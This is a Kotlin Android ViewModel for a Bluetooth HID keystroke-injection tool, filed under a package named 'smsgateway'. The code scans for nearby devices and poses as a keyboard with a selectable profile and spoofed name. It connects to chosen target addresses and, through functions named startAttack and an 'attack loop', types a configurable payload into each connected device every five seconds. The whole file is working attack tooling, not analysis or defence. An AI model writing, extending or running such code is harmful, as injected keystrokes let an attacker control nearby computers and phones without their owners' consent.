package com.sunfeld.smsgateway

import android.bluetooth.BluetoothDevice
import android.content.Context
import android.os.Build
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

sealed class HidState {
    data object Idle : HidState()
    data object Scanning : HidState()
    data class Attacking(val connectedCount: Int) : HidState()
    data object Stopping : HidState()
    data class Error(val message: String) : HidState()
}

class BluetoothHidViewModel : ViewModel() {

    internal val scanner = BluetoothScanner()
    internal val hidManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        BluetoothHidManager()
    } else null

    private val _state = MutableLiveData<HidState>(HidState.Idle)
    val state: LiveData<HidState> = _state

    private val _discoveredDevices = MutableLiveData<List<BluetoothDevice>>(emptyList())
    val discoveredDevices: LiveData<List<BluetoothDevice>> = _discoveredDevices

    private val _connectedCount = MutableLiveData(0)
    val connectedCount: LiveData<Int> = _connectedCount

    private val _keystrokesSent = MutableLiveData(0)
    val keystrokesSent: LiveData<Int> = _keystrokesSent

    // User-configurable fields
    val selectedProfile = MutableLiveData<DeviceProfile>(DeviceProfiles.DEFAULT)
    val customDeviceName = MutableLiveData<String>(DeviceProfiles.DEFAULT.sdpName)
    val selectedTargets = MutableLiveData<Set<String>>(emptySet())
    val payload = MutableLiveData("Hello from your keyboard!\n")

    private var scanObserverJob: Job? = null
    private var connectedObserverJob: Job? = null
    private var keystrokeObserverJob: Job? = null
    private var attackLoopJob: Job? = null

    private val cycleDelayMs = 5_000L

    fun startAttack(context: Context) {
        if (_state.value is HidState.Scanning || _state.value is HidState.Attacking) return

        val profile = selectedProfile.value ?: DeviceProfiles.DEFAULT
        val name = customDeviceName.value
        val targets = selectedTargets.value ?: emptySet()

        if (targets.isEmpty()) return

        _state.value = HidState.Scanning
        _connectedCount.value = 0
        _keystrokesSent.value = 0

        // Register HID profile with selected device profile
        hidManager?.register(context, profile, name)

        // Start BT scan
        scanner.startScan(context)

        // Observe discovered devices — connect HID only to selected targets
        scanObserverJob = viewModelScope.launch {
            scanner.devices.collect { devices ->
                _discoveredDevices.postValue(devices)
                devices.filter { targets.contains(it.address) }.forEach { device ->
                    hidManager?.connect(device)
                }
                if (devices.any { targets.contains(it.address) } && _state.value is HidState.Scanning) {
                    _state.postValue(HidState.Attacking(0))
                }
            }
        }

        // Observe HID connected count
        connectedObserverJob = viewModelScope.launch {
            hidManager?.connectedDevices?.collect { connected ->
                _connectedCount.postValue(connected.size)
                if (_state.value is HidState.Attacking || _state.value is HidState.Scanning) {
                    _state.postValue(HidState.Attacking(connected.size))
                }
            }
        }

        // Observe keystroke counter
        keystrokeObserverJob = viewModelScope.launch {
            hidManager?.keystrokesSent?.collect { count ->
                _keystrokesSent.postValue(count)
            }
        }

        // Attack loop: send keystrokes to connected devices periodically
        attackLoopJob = viewModelScope.launch {
            while (true) {
                delay(cycleDelayMs)
                val currentPayload = payload.value ?: "Hello from your keyboard!\n"
                val connected = hidManager?.connectedDevices?.value ?: emptySet()
                connected.forEach { device ->
                    hidManager?.sendText(device, currentPayload)
                }
            }
        }
    }

    fun stopAttack(context: Context) {
        if (_state.value is HidState.Idle || _state.value is HidState.Stopping) return

        _state.value = HidState.Stopping

        scanObserverJob?.cancel()
        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()

        scanner.stopScan(context)
        hidManager?.disconnectAll()
        hidManager?.unregister(context)

        _state.value = HidState.Idle
    }

    fun dismissError() {
        _state.value = HidState.Idle
    }

    override fun onCleared() {
        super.onCleared()
        scanObserverJob?.cancel()
        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()
    }
}
